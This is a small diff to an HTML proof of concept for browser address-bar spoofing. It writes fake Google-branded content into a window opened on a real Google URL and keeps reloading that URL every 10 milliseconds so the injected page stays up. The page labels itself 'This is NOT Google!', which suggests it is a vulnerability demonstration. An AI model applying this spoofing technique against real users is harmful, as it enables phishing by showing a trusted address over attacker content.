@@ -4,7 +4,7 @@
 <button onclick="spoof()">Click to spoof</button>
 <script>
 function spoof() {
-    let win = window.open("https://www.google.com:6969");
+    let win = window.open("https://www.google.com/csi");
     let payload = '<div style="text-align:center; font-family:Arial, sans-serif;">' +
         '<img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google Logo" style="margin-top:20px;">' +
         '<h1>This is NOT Google!</h1>' +
@@ -18,7 +18,7 @@ function spoof() {
     win.document.write(payload);
     win.document.close();
     setInterval(function() {
-        win.location.replace("https://www.google.com:8080");
+        win.location.replace("https://www.google.com/csi");
     }, 10);  // Small interval to preserve the spoof
 }
 </script>
